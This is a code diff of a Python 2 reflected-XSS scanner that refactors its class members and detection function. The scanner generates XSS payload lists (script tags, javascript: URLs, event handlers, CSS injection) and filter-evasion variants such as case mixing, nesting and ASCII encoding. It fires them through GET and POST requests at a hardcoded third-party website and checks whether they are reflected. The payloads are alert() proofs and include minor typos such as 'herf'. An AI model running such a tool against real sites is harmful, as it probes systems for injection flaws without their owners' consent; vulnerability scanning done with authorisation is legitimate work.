@@ -9,12 +9,12 @@ test_url = "http://www.zhjzg.com/ship.asp?id=4"
 
 class DO_Reflect_Attack(object):
 
-    attack_vector = []
-    length_attack_vector_lists = 0
+    __attack_vector_list = []
+    __length_attack_vector_list = 0
 
     def __init__(self, level):
-        self.attack_vector = Attack_Vector_Factory().get_Attack_Vector_lists(level)
-        self.length_attack_vector_lists = len(self.attack_vector)
+        self.__attack_vector_list = Attack_Vector_Factory().get_Attack_Vector_lists(level)
+        self.__length_attack_vector_list = len(self.__attack_vector_list)
 
     def do_Reflect_Attack(self, inserturl):
         '''
@@ -22,11 +22,11 @@ class DO_Reflect_Attack(object):
         '''
 
         #@return "find" or "None"
-        result = self.do_Reflect_GET_Attack(inserturl)
+        result = self.__do_Reflect_GET_Attack(inserturl)
         if result != None:
             print "Reflect GET XSS leak is exist~!"
             return "find"
-        result = self.do_Reflect_POST_Attack(inserturl)
+        result = self.__do_Reflect_POST_Attack(inserturl)
         if result != None:
             print "Reflect POST XSS leak is exist~!"
             return "find"
@@ -34,16 +34,16 @@ class DO_Reflect_Attack(object):
         print "No Reflect XSS leak~!"
         return None
 
-    def do_Reflect_GET_Attack(self, inserturl):
+    def __do_Reflect_GET_Attack(self, inserturl):
         '''
         Reflect GET Attack main method
         '''
 
         # 攻击向量挨个测试
-        for vector_i in range(self.length_attack_vector_lists):
+        for vector_i in range(self.__length_attack_vector_list):
 
             # 构造测试URL
-            url = inserturl + self.attack_vector[vector_i]
+            url = inserturl + self.__attack_vector_list[vector_i]
 
             # 发送request，获取response
             response = do_HTTP_request(url)
@@ -55,10 +55,10 @@ class DO_Reflect_Attack(object):
 
             # 若返回码是200，则判断response html，是否存在XSS漏洞
             html = response.read()
-            if judge_HTML_If_XSS_Exist(html):
+            if judge_HTML_If_XSS_Exist(html, self.__attack_vector_list[vector_i]):
                 return "find"
 
-    def do_Reflect_POST_Attack(self, inserturl):
+    def __do_Reflect_POST_Attack(self, inserturl):
         '''
         Reflect POST Attack main method
         '''
@@ -72,19 +72,19 @@ class DO_Reflect_Attack(object):
             return None
         html = response.read()
         post_names = re_HTML_GET_POST_Names(html)
-        length_post_names = len(post_names)
 
         # 如果html中不存在的字符串，即不存在输入框，则返回None
         if post_names == None:
-            print "POST Input Frame is inexist"
             return None
 
+        length_post_names = len(post_names)
+
         # 攻击向量挨个测试
-        for vector_i in range(self.length_attack_vector_lists):
+        for vector_i in range(self.__length_attack_vector_list):
 
             # 构造post参数名-值对
             for i in range(length_post_names):
-                params[post_names[i]] = attack_vector[vector_i]
+                params[post_names[i]] = self.__attack_vector_list[vector_i]
 
             # 获取response html
             response = do_HTTP_request(inserturl, params)
@@ -94,7 +94,7 @@ class DO_Reflect_Attack(object):
             html = response.read()
 
             # 判断response html，是否存在XSS漏洞
-            if judge_HTML_If_XSS_Exist( html):
+            if judge_HTML_If_XSS_Exist( html, self.__attack_vector_list[vector_i]):
                 return "find"
 
 
@@ -103,12 +103,12 @@ class Attack_Vector_Factory(object):
     Product Attack Vector
     '''
 
-    lists = []
-    basic_lists = []    # level_2
+    __lists = []
+    __basic_lists = []    # save level_2 status
 
     def __init__(self):
-        self.lists = []
-        self.basic_lists = []
+        self.__lists = []
+        self.__basic_lists = []
 
     def get_Attack_Vector_lists(self, level):
         '''
@@ -117,82 +117,77 @@ class Attack_Vector_Factory(object):
 
         if level == 1:
             print "Low-intensity Test is running..."
-            self.buid_Lists_1_CommonTag()
-            return self.lists
+            self.__build_lists_1_CommonTag()
+            return self.__lists
         elif level == 2:
             print "Medium-intensity Test is running..."
-            self.buid_Lists_1_CommonTag()
-            self.buid_Lists_2_PseudoURL()
-            self.buid_Lists_3_HTMLEvent()
-            self.buid_Lists_4_CSS()
-            return self.lists
+            self.__build_lists_1_CommonTag()
+            self.__build_lists_2_PseudoURL()
+            self.__build_lists_3_HTMLEvent()
+            self.__build_lists_4_CSS()
+            return self.__lists
         elif level == 3:
             print "High-intensity Test is running..."
-            self.buid_Lists_1_CommonTag()
-            self.buid_Lists_2_PseudoURL()
-            self.buid_Lists_3_HTMLEvent()
-            self.buid_Lists_4_CSS()
+            self.__build_lists_1_CommonTag()
+            self.__build_lists_2_PseudoURL()
+            self.__build_lists_3_HTMLEvent()
+            self.__build_lists_4_CSS()
 
-            self.basic_lists = list(self.lists)
+            self.__basic_lists = list(self.__lists)
 
-            self.rebuild_Lists_1_AaBb()
-            self.rebuild_Lists_2_Space()
-            self.rebuild_Lists_3_Nest()
-            self.rebuild_Lists_4_ASCII()
-            self.rebuild_Lists_5_Nature()
-            self.rebuild_Lists_6_Notes()
-            self.rebuild_Lists_7_HTMLEncode()
-            return self.lists
+            self.__rebuild_lists_1_AaBb()
+            self.__rebuild_lists_2_Space()
+            self.__rebuild_lists_3_Nest()
+            self.__rebuild_lists_4_ASCII()
+            self.__rebuild_lists_5_Nature()
+            self.__rebuild_lists_6_Notes()
+            self.__rebuild_lists_7_HTMLEncode()
+            return self.__lists
         else:
             print "Input error~!"
 
-    def buid_Lists_1_CommonTag(self):
+    def __build_lists_1_CommonTag(self):
         '''
-        @ ????????
-        ??????<script>??????JavaScript??
+        Common Tag Insert
         '''
 
         build_lists = ["<script>alert('Spartans')</script>"]
-        self.lists += build_lists
+        self.__lists += build_lists
 
-    def buid_Lists_2_PseudoURL(self):
+    def __build_lists_2_PseudoURL(self):
         '''
-        @ ????????
-        ??????JavaScript?URL?????
+        URL Pseudo agreement Insert
         '''
 
         build_lists = ["<img src=\"javascript:alert('Spartans')\"/>",
                        "<a herf=\"javascript:alert('Spartans'))\">click here</a>",
                        "<iframe src=\"javascript:alert('Spartans')\"></iframe>"]
-        self.lists += build_lists
+        self.__lists += build_lists
 
-    def buid_Lists_3_HTMLEvent(self):
+    def __build_lists_3_HTMLEvent(self):
         '''
-        @ ????????
-        ??????HTML????
+        HTML Event Insert
         '''
 
         build_lists = ["<body onload=\"alert('Spartans')\"></body>",
                        "<img src=\"#\" onerror=\"alert('Spartans')\"/>"]
-        self.lists += build_lists
+        self.__lists += build_lists
 
-    def buid_Lists_4_CSS(self):
+    def __build_lists_4_CSS(self):
         '''
-        @ ????????
-        ?????????????
+        CSS Insert
         '''
 
         build_lists = ["<div style=\"background-image: url(javascript:alert('Spartans'))\">",
                        "<style type=\"test/javascript\">alert('Spartans');</style>"]
-        self.lists += build_lists
+        self.__lists += build_lists
 
-    def rebuild_Lists_1_AaBb(self):
+    def __rebuild_lists_1_AaBb(self):
         '''
-        @ ?????????
-        ?????????
+        Case sensitive Convertor
         '''
 
-        tmp_lists = list(self.basic_lists)
+        tmp_lists = list(self.__basic_lists)
         rebuild_lists = []
         beforeStr = "script"
         laterStr = "scRiPt"
@@ -200,21 +195,19 @@ class Attack_Vector_Factory(object):
         if len(tmp_lists) == 0:
             return None
 
-        # ????beforeStr???????laterStr
         for i in range(len(tmp_lists)):
             if beforeStr in tmp_lists[i]:
                 tmp_lists[i] = tmp_lists[i].replace(beforeStr, laterStr)
                 rebuild_lists.append(tmp_lists[i])
 
-        self.lists += rebuild_lists
+        self.__lists += rebuild_lists
 
-    def rebuild_Lists_2_Space(self):
+    def __rebuild_lists_2_Space(self):
         '''
-        @ ?????????
-        ????????????????????
+        Add Space Convertor
         '''
 
-        tmp_lists = list(self.basic_lists)
+        tmp_lists = list(self.__basic_lists)
         rebuild_lists = []
         beforeStr1 = "<script"
         beforeStr2 = "script>"
@@ -224,7 +217,6 @@ class Attack_Vector_Factory(object):
         if len(tmp_lists) == 0:
             return None
 
-        # ????beforeStr???????laterStr
         for i in range(len(tmp_lists)):
             tmpStr = tmp_lists[i].replace(beforeStr1, laterStr1)
             tmpStr = tmpStr.replace(beforeStr2, laterStr2)
@@ -233,15 +225,14 @@ class Attack_Vector_Factory(object):
                 tmp_lists[i] = tmpStr
                 rebuild_lists.append(tmp_lists[i])
 
-        self.lists += rebuild_lists
+        self.__lists += rebuild_lists
 
-    def rebuild_Lists_3_Nest(self):
+    def __rebuild_lists_3_Nest(self):
         '''
-        @ ?????????
-        ????????????????
+        Nest Convertor
         '''
 
-        tmp_lists = list(self.basic_lists)
+        tmp_lists = list(self.__basic_lists)
         rebuild_lists = []
         beforeStr = "script"
         laterStr = "scr<script>ipt"
@@ -249,7 +240,6 @@ class Attack_Vector_Factory(object):
         if len(tmp_lists) == 0:
             return None
 
-        # ????beforeStr???????laterStr
         for i in range(len(tmp_lists)):
             tmpStr = tmp_lists[i].replace(beforeStr, laterStr)
 
@@ -257,15 +247,14 @@ class Attack_Vector_Factory(object):
                 tmp_lists[i] = tmpStr
                 rebuild_lists.append(tmp_lists[i])
 
-        self.lists += rebuild_lists
+        self.__lists += rebuild_lists
 
-    def rebuild_Lists_4_ASCII(self):
+    def __rebuild_lists_4_ASCII(self):
         '''
-        @ ?????????
-        ???????????ASCII?
+        ASCII Convertor
         '''
 
-        tmp_lists = list(self.basic_lists)
+        tmp_lists = list(self.__basic_lists)
         rebuild_lists = []
         beforeStr1 = "java"
         beforeStr2 = "script"
@@ -275,7 +264,6 @@ class Attack_Vector_Factory(object):
         if len(tmp_lists) == 0:
             return None
 
-        # ????beforeStr???????laterStr
         for i in range(len(tmp_lists)):
             tmpStr = tmp_lists[i].replace(beforeStr1, laterStr1)
             tmpStr = tmpStr.replace(beforeStr2, laterStr2)
@@ -284,24 +272,21 @@ class Attack_Vector_Factory(object):
                 tmp_lists[i] = tmpStr
                 rebuild_lists.append(tmp_lists[i])
 
-        self.lists += rebuild_lists
+        self.__lists += rebuild_lists
 
-    def rebuild_Lists_5_Nature(self):
+    def __rebuild_lists_5_Nature(self):
         '''
-        @ ?????????
-        ??????????javascript??????????????????????>????????????????
-        '''
-
-    def rebuild_Lists_6_Notes(self):
-        '''
-        @ ?????????
-        ?????????????????
+        Nature Convertor
         '''
 
-    def rebuild_Lists_7_HTMLEncode(self):
+    def __rebuild_lists_6_Notes(self):
         '''
-        @ ?????????
-        ???????????HTML?????????????
+        Notes Convertor
+        '''
+
+    def __rebuild_lists_7_HTMLEncode(self):
+        '''
+        HTMLEncode Convertor
         '''
 
 
@@ -344,6 +329,7 @@ def re_HTML_GET_POST_Names ( html):
     # Judge if the specific token exist
     length = len ( match.findall(html))
     if length == 0:
+        print "POST Input frame is inexist~!"
         return None
 
     # Trim the names lists
@@ -353,15 +339,15 @@ def re_HTML_GET_POST_Names ( html):
 
     return names
 
-def judge_HTML_If_XSS_Exist( html):
+def judge_HTML_If_XSS_Exist( html, attack_vector):
     '''
-    Judge if the html exist xss
+    Judge if the html source code exist xss
     '''
 
     return attack_vector in html
 
 def main() :
-    DO_Reflect_Attack(1).do_Reflect_Attack( test_url )
+    DO_Reflect_Attack(2).do_Reflect_Attack( test_url )
 
 if __name__ == "__main__" :
     main()
